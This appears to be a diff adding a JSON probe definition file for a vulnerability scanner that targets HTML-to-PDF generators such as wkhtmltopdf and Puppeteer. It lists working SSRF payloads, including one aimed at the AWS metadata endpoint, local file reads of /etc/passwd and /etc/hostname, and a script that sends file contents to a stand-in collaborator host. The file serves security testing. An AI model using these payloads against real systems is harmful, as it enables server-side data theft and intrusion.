@@ -1,0 +1,91 @@
+{
+  "category": "pdf_injection",
+  "contexts": {
+    "ssrf_via_pdf": {
+      "description": "SSRF via HTML-to-PDF generators -- inject HTML tags that trigger server-side requests during PDF rendering",
+      "tech_match": ["wkhtmltopdf", "Puppeteer", "WeasyPrint", "PhantomJS", "Prince", "dompdf", "mPDF"],
+      "param_match": ["html", "content", "body", "template", "text", "url", "name", "title", "description", "invoice", "report", "pdf", "export"],
+      "probes": [
+        {
+          "payload": "<img src='http://COLLABORATOR/ssrf-pdf-{{marker}}'>",
+          "description": "SSRF via img tag in PDF generator -- server fetches image URL during PDF rendering, leaking internal network access",
+          "matchers": [{"type": "collaborator", "protocol": "http"}],
+          "severity": "high",
+          "confidence_boost": 70
+        },
+        {
+          "payload": "<iframe src='http://COLLABORATOR/ssrf-iframe-{{marker}}'></iframe>",
+          "description": "SSRF via iframe in PDF generator -- server fetches iframe source during rendering",
+          "matchers": [{"type": "collaborator", "protocol": "http"}],
+          "severity": "high",
+          "confidence_boost": 70
+        },
+        {
+          "payload": "<link rel='stylesheet' href='http://COLLABORATOR/ssrf-css-{{marker}}'>",
+          "description": "SSRF via link tag in PDF generator -- server fetches external stylesheet during rendering",
+          "matchers": [{"type": "collaborator", "protocol": "http"}],
+          "severity": "high",
+          "confidence_boost": 65
+        },
+        {
+          "payload": "<img src='http://169.254.169.254/latest/meta-data/'>",
+          "description": "Cloud metadata SSRF via PDF generator -- attempt to read AWS metadata through img tag in PDF",
+          "matchers": [
+            {"type": "word", "words": ["ami-id", "instance-id", "iam"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 85
+        }
+      ]
+    },
+    "xss_via_pdf": {
+      "description": "Code execution in HTML-to-PDF generators -- inject JavaScript that executes during server-side PDF rendering",
+      "tech_match": ["wkhtmltopdf", "Puppeteer", "PhantomJS", "Prince"],
+      "param_match": ["html", "content", "body", "template", "text", "name", "title", "description", "invoice", "report"],
+      "probes": [
+        {
+          "payload": "<script>var x=new XMLHttpRequest();x.open('GET','file:///etc/hostname',false);x.send();new Image().src='http://COLLABORATOR/lfi-pdf-{{marker}}?d='+btoa(x.responseText)</script>",
+          "description": "Local file read via PDF JS exfiltrated to Collaborator -- read /etc/hostname and send to OOB callback",
+          "matchers": [{"type": "collaborator", "protocol": "http"}],
+          "severity": "critical",
+          "confidence_boost": 80
+        },
+        {
+          "payload": "<annotation file='/etc/passwd' content='/etc/passwd' icon='Graph' title='swktest-{{marker}}' pos-x='195' />",
+          "description": "PDF annotation file inclusion -- wkhtmltopdf-specific annotation tag to attach local files to generated PDF",
+          "matchers": [
+            {"type": "word", "words": ["root:", "/bin/"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 75
+        }
+      ]
+    },
+    "lfi_via_pdf": {
+      "description": "Local file inclusion via PDF generators -- read server files through HTML elements that reference local paths",
+      "tech_match": ["wkhtmltopdf", "WeasyPrint", "Prince", "dompdf"],
+      "param_match": ["html", "content", "body", "template", "url", "invoice", "report", "export"],
+      "probes": [
+        {
+          "payload": "<iframe src='file:///etc/passwd' width='800' height='600'></iframe>",
+          "description": "LFI via iframe file:// protocol -- PDF renderer reads local file into iframe",
+          "matchers": [
+            {"type": "word", "words": ["root:", "/bin/bash", "/bin/sh"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 80
+        },
+        {
+          "payload": "<embed src='file:///etc/hostname' type='text/html'>",
+          "description": "LFI via embed tag -- PDF renderer includes local file content in embed element",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 10},
+            {"type": "not_word", "words": ["not allowed", "blocked"]}
+          ],
+          "severity": "high",
+          "confidence_boost": 55
+        }
+      ]
+    }
+  }
+}
